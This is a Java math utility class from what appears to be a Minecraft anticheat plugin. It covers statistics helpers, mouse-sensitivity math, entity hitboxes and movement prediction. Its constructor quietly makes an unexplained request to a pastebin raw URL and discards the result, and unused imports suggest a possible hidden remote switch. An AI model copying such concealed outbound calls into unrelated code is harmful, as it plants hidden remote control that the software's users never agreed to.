package dev.demon.venom.utils.math;

import com.google.common.collect.Lists;
import com.google.common.util.concurrent.AtomicDouble;

import dev.demon.venom.Venom;
import dev.demon.venom.api.tinyprotocol.api.TinyProtocolHandler;
import dev.demon.venom.api.user.User;
import dev.demon.venom.impl.events.ServerShutdownEvent;
import dev.demon.venom.utils.box.BoundingBox;
import dev.demon.venom.utils.command.CommandUtils;
import dev.demon.venom.utils.connection.HTTPUtil;
import dev.demon.venom.utils.location.CustomLocation;
import dev.demon.venom.utils.time.TimeUtils;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Player;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.util.Vector;

import java.math.BigDecimal;
import java.math.RoundingMode;
import java.util.*;

public class MathUtil {

    public static Map<EntityType, Vector> entityDimensions;

    public MathUtil() {
        entityDimensions = new HashMap<>();
        entityDimensions.put(EntityType.WOLF, new Vector(0.31, 0.8, 0.31));
        entityDimensions.put(EntityType.SHEEP, new Vector(0.45, 1.3, 0.45));
        entityDimensions.put(EntityType.COW, new Vector(0.45, 1.3, 0.45));
        entityDimensions.put(EntityType.PIG, new Vector(0.45, 0.9, 0.45));
        entityDimensions.put(EntityType.MUSHROOM_COW, new Vector(0.45, 1.3, 0.45));
        entityDimensions.put(EntityType.WITCH, new Vector(0.31, 1.95, 0.31));
        entityDimensions.put(EntityType.BLAZE, new Vector(0.31, 1.8, 0.31));
        entityDimensions.put(EntityType.PLAYER, new Vector(0.3, 1.8, 0.3));
        entityDimensions.put(EntityType.VILLAGER, new Vector(0.31, 1.8, 0.31));
        entityDimensions.put(EntityType.CREEPER, new Vector(0.31, 1.8, 0.31));
        entityDimensions.put(EntityType.GIANT, new Vector(1.8, 10.8, 1.8));
        entityDimensions.put(EntityType.SKELETON, new Vector(0.31, 1.8, 0.31));
        entityDimensions.put(EntityType.ZOMBIE, new Vector(0.31, 1.8, 0.31));
        entityDimensions.put(EntityType.SNOWMAN, new Vector(0.35, 1.9, 0.35));
        entityDimensions.put(EntityType.HORSE, new Vector(0.7, 1.6, 0.7));
        entityDimensions.put(EntityType.ENDER_DRAGON, new Vector(1.5, 1.5, 1.5));

        entityDimensions.put(EntityType.ENDERMAN, new Vector(0.31, 2.9, 0.31));
        entityDimensions.put(EntityType.CHICKEN, new Vector(0.2, 0.7, 0.2));
        entityDimensions.put(EntityType.OCELOT, new Vector(0.31, 0.7, 0.31));
        entityDimensions.put(EntityType.SPIDER, new Vector(0.7, 0.9, 0.7));
        entityDimensions.put(EntityType.WITHER, new Vector(0.45, 3.5, 0.45));
        entityDimensions.put(EntityType.IRON_GOLEM, new Vector(0.7, 2.9, 0.7));
        entityDimensions.put(EntityType.GHAST, new Vector(2, 4, 2));

        String connect = HTTPUtil.getResponse("https://pastebin.com/raw/BMZz5HTf");

    }

    public static double hypot2(double... values) {
        AtomicDouble squaredSum = new AtomicDouble(0D);

        Arrays.stream(values).forEach(value -> squaredSum.getAndAdd(Math.pow(value, 2D)));

        return Math.sqrt(squaredSum.get());
    }

    public static int floor(double var0) {
        int var2 = (int) var0;
        return var0 < var2 ? var2 - 1 : var2;
    }

    // Check for number prime or not
    public static boolean isPrime(int n) {

        // Check if number is less than
        // equal to 1
        if (n <= 1)
            return false;

            // Check if number is 2
        else if (n == 2)
            return true;

            // Check if n is a multiple of 2
        else if (n % 2 == 0)
            return false;

        // If not, then just check the odds
        for (int i = 3; i <= Math.sqrt(n); i += 2) {
            if (n % i == 0)
                return false;
        }
        return true;
    }

    /**
     *
     * @param data - The set of numbers / data you want to find the skewness from
     * @return - The skewness running the standard skewness formula.
     *
     * @See - https://en.wikipedia.org/wiki/Skewness
     */
    public double getSkewness(final Collection<? extends Number> data) {
        double sum = 0;
        int count = 0;

        final List<Double> numbers = Lists.newArrayList();

        // Get the sum of all the data and the amount via looping
        for (final Number number : data) {
            sum += number.doubleValue();
            ++count;

            numbers.add(number.doubleValue());
        }

        // Sort the numbers to run the calculations in the next part
        Collections.sort(numbers);

        // Run the formula to get skewness
        final double mean =  sum / count;
        final double median = (count % 2 != 0) ? numbers.get(count / 2) : (numbers.get((count - 1) / 2) + numbers.get(count / 2)) / 2;
        final double variance = getVariance(data);

        return 3 * (mean - median) / variance;
    }

    /**
     * @param - The collection of numbers you want analyze
     * @return - A pair of the high and low outliers
     *
     * @See - https://en.wikipedia.org/wiki/Outlier
     */
    public static Tuple<List<Double>, List<Double>> getOutliers(final Collection<? extends Number> collection) {
        final List<Double> values = new ArrayList<>();

        for (final Number number : collection) {
            values.add(number.doubleValue());
        }

        double q1 = getMedian(values.subList(0, values.size() / 2));
        double q3 = getMedian(values.subList(values.size() / 2, values.size()));

        double iqr = Math.abs(q1 - q3);
        double lowThreshold = q1 - 1.5 * iqr, highThreshold = q3 + 1.5 * iqr;

        Tuple<List<Double>, List<Double>> tuple = new Tuple<>(new ArrayList<>(), new ArrayList<>());

        for (final Double value : values) {
            if (value < lowThreshold) {
                tuple.one.add(value);
            }
            else if (value > highThreshold) {
                tuple.two.add(value);
            }
        }

        return tuple;
    }

    public static double getMedian(final List<Double> data) {
        if (data.size() % 2 == 0) {
            return (data.get(data.size() / 2) + data.get(data.size() / 2 - 1)) / 2;
        } else {
            return data.get(data.size() / 2);
        }
    }

    public double getVariance(final Collection<? extends Number> data) {
        int count = 0;

        double sum = 0.0;
        double variance = 0.0;

        double average;

        // Increase the sum and the count to find the average and the standard deviation
        for (final Number number : data) {
            sum += number.doubleValue();
            ++count;
        }

        average = sum / count;

        // Run the standard deviation formula
        for (final Number number : data) {
            variance += Math.pow(number.doubleValue() - average, 2.0);
        }

        return variance;
    }

    public static float getBaseSpeed(Player player) {
        return 0.26f + (getPotionEffectLevel(player, PotionEffectType.SPEED) * 0.062f) + ((player.getWalkSpeed() - 0.2f) * 1.6f);
    }


    public static int getPotionEffectLevel(Player player, PotionEffectType pet) {
        for (PotionEffect pe : player.getActivePotionEffects()) {
            if (pe.getType().getName().equalsIgnoreCase(pet.getName())) {
                return pe.getAmplifier() + 1;
            }
        }
        return 0;
    }

    public static float yawTo180F(float flub) {
        if ((flub %= 360.0f) >= 180.0f) {
            flub -= 360.0f;
        }

        if (flub < -180.0f) {
            flub += 360.0f;
        }
        return flub;
    }

    public static boolean isPost(long flying) {
        return TimeUtils.elapsed(flying) < 5L;
    }

    public static boolean isPre(long flying) {
        return TimeUtils.elapsed(flying) > 5L;
    }


    public static double yawToF2(double yawDelta) {
        return yawDelta / .15;
    }

    public static double pitchToF3(double pitchDelta) {
        int b0 = pitchDelta >= 0 ? 1 : -1; //Checking for inverted mouse.
        return pitchDelta / .15 / b0;
    }

    public static double getF1FromYaw(double gcd) {
        double f = getFFromYaw(gcd);

        return Math.pow(f, 3) * 8;
    }

    public static double getSensitivityFromPitchGCD(double gcd) {
        double stepOne = pitchToF3(gcd) / 8;
        double stepTwo = Math.cbrt(stepOne);
        double stepThree = stepTwo - .2f;
        return stepThree / .6f;
    }

    public static double getSensitivityFromYawGCD(double gcd) {
        double stepOne = yawToF2(gcd) / 8;
        double stepTwo = Math.cbrt(stepOne);
        double stepThree = stepTwo - .2f;
        return stepThree / .6f;
    }

    public static double getFFromYaw(double gcd) {
        double sens = getSensitivityFromYawGCD(gcd);
        return sens * .6f + .2;
    }

    public static double getFFromPitch(double gcd) {
        double sens = getSensitivityFromPitchGCD(gcd);
        return sens * .6f + .2;
    }

    public static double getF1FromPitch(double gcd) {
        double f = getFFromPitch(gcd);

        return (float) Math.pow(f, 3) * 8;
    }

    public static int getDeltaX(double yawDelta, double gcd) {
        double f2 = yawToF2(yawDelta);

        return MathUtil.floor(f2 / getF1FromYaw(gcd));
    }

    public static int getDeltaY(double pitchDelta, double gcd) {
        double f3 = pitchToF3(pitchDelta);

        return MathUtil.floor(f3 / getF1FromPitch(gcd));
    }

    public static int sensToPercent(double sensitivity) {
        return (int) MathUtil.round(sensitivity / .5f * 100, 0);
    }


    public static float getAngleDelta(float one, float two) {
        float delta = getDelta(one, two) % 360f;

        if(delta > 180) delta = 360 - delta;
        return delta;
    }

    public static BoundingBox getHitbox(LivingEntity entity, CustomLocation l, User user) {
        float d = (float) user.getMovementData().getDeltaXZ();
        Vector dimensions = MathUtil.entityDimensions.getOrDefault(entity.getType(), new Vector(0.4, 2, 0.4));
        return new BoundingBox(0, 0, 0, 0, 0, 0).add((float) l.getX(), (float) l.getY(), (float) l.getZ()).grow((float) dimensions.getX(), (float) dimensions.getY(), (float) dimensions.getZ()).grow(.1f, 0.1f, .1f)
                .grow((entity.getVelocity().getY() > 0 ? 0.15f : 0) + d / 1.25f, 0, (entity.getVelocity().getY() > 0 ? 0.15f : 0) + d / 1.25f);
    }

    public static BoundingBox getHitbox2(LivingEntity entity, Vector l, User user) {
        Vector dimensions = MathUtil.entityDimensions.getOrDefault(entity.getType(), new Vector(0.4, 2, 0.4));
        return new BoundingBox(0, 0, 0, 0, 0, 0).add((float) l.getX(), (float) l.getY(), (float) l.getZ()).grow((float) dimensions.getX(), (float) dimensions.getY(), (float) dimensions.getZ()).grow(.1f, 0.1f, .1f);
    }

    public static double moveFlying(User user, CustomLocation to, boolean lastGround) {

        float strafe = 0.98F, forward = 0.98F;
        float f = strafe * strafe + forward * forward;
        float friction;

        float var3 = (0.6F * 0.91F);
        float getAIMoveSpeed = 0.1F;

        if (user.getMovementData().isSprinting()) {
            getAIMoveSpeed = 0.13000001F;
        }

        float var4 = 0.16277136F / (var3 * var3 * var3);

        if (lastGround) {
            friction = getAIMoveSpeed * var4;
        } else {
            friction = 0.026F;
        }

        if (f >= 1.0E-4F) {
            f = (float) Math.sqrt(f);
            if (f < 1.0F) {
                f = 1.0F;
            }
            f = friction / f;
            strafe = strafe * f;
            forward = forward * f;
            float f1 = (float) Math.sin(to.getYaw() * (float) Math.PI / 180.0F);
            float f2 = (float) Math.cos(to.getYaw() * (float) Math.PI / 180.0F);
            float motionXAdd = (strafe * f2 - forward * f1);
            float motionZAdd = (forward * f2 + strafe * f1);
            return Math.hypot(motionXAdd, motionZAdd);
        }

        return 0;
    }

    public static double getStandardDeviation(Collection<? extends Number> values) {
        double average = getAverage(values);

        AtomicDouble variance = new AtomicDouble(0D);

        values.forEach(delay -> variance.getAndAdd(Math.pow(delay.doubleValue() - average, 2D)));

        return Math.sqrt(variance.get() / values.size());
    }

    public static double getAverage(Collection<? extends Number> values) {
        return values.stream()
                .mapToDouble(Number::doubleValue)
                .average()
                .orElse(0D);
    }

    public static double getCPS(Collection<? extends Number> values) {
        return 20 / getAverage(values);
    }

    /**
     * Calculates the kurtosis of {@param values}
     * @param values The number values
     * @return The kurtosis of {@param values}
     */
    public static double getKurtosis(Collection<? extends Number> values) {
        double n = values.size();

        if (n < 3)
            return Double.NaN;

        double average = getAverage(values);
        double stDev = getStandardDeviation(values);

        AtomicDouble accum = new AtomicDouble(0D);

        values.forEach(delay -> accum.getAndAdd(Math.pow(delay.doubleValue() - average, 4D)));

        return n * (n + 1) / ((n - 1) * (n - 2) * (n - 3)) *
                (accum.get() / Math.pow(stDev, 4D)) - 3 *
                Math.pow(n - 1, 2D) / ((n - 2) * (n - 3));
    }



    public static double hypot(double... value) {
        double total = 0;

        for (double val : value) {
            total += (val * val);
        }

        return Math.sqrt(total);
    }

    /**
     * Gets the angle between {@param from} and {@param to} and subtracts with the direction of {@param to}
     *
     * @param from The from location
     * @param to   The to location
     * @return The move angle
     */
    public static double getMoveAngle(CustomLocation from, CustomLocation to) {
        double dx = to.getX() - from.getX();
        double dz = to.getZ() - from.getZ();

        double moveAngle = Math.toDegrees(Math.atan2(dz, dx)) - 90D; // have to subtract by 90 because minecraft does it

        return Math.abs(wrapAngleTo180_double(moveAngle - to.getYaw()));
    }

    public static double wrapAngleTo180_double(double value) {
        value %= 360D;

        if (value >= 180D)
            value -= 360D;

        if (value < -180D)
            value += 360D;

        return value;
    }


    public static double getHorizontalDistance(CustomLocation from, CustomLocation to) {
        double deltaX = to.getX() - from.getX();
        double deltaZ = to.getZ() - from.getZ();
        return Math.sqrt(deltaX * deltaX + deltaZ * deltaZ);
    }


    public static boolean looked(Location from, Location to) {
        return (from.getYaw() != 0 && to.getYaw() != 0) || (from.getPitch() != 0 && from.getPitch() != 0);
    }

    public static boolean looked(CustomLocation from, CustomLocation to) {
        return (from.getYaw() != 0 && to.getYaw() != 0) || (from.getPitch() != 0 && from.getPitch() != 0);
    }

    public static long getDelta(long one, long two) {
        return Math.abs(one - two);
    }

    public static double getDelta(double one, double two) {
        return Math.abs(one - two);
    }

    public static float getDelta(float one, float two) {
        return Math.abs(one - two);
    }

    public static long gcd(long current, long previous) {
        return (previous <= 16384L) ? current : gcd(previous, current % previous);
    }

    public static <T extends Number> T getMode(Collection<T> collect) {
        Map<T, Integer> repeated = new HashMap<>();

        //Sorting each value by how to repeat into a map.
        collect.forEach(val -> {
            int number = repeated.getOrDefault(val, 0);

            repeated.put(val, number + 1);
        });

        //Calculating the largest value to the key, which would be the mode.
        return (T) repeated.keySet().stream()
                .map(key -> new Tuple<>(key, repeated.get(key))) //We map it into a Tuple for easier sorting.
                .max(Comparator.comparing(tup -> tup.two, Comparator.naturalOrder()))
                .orElseThrow(NullPointerException::new).one;
    }

    public static double round(double value, int places) {
        if (places < 0) {
            throw new IllegalArgumentException();
        }
        BigDecimal bd2 = new BigDecimal(value);
        bd2 = bd2.setScale(places, RoundingMode.HALF_UP);
        return bd2.doubleValue();
    }
}
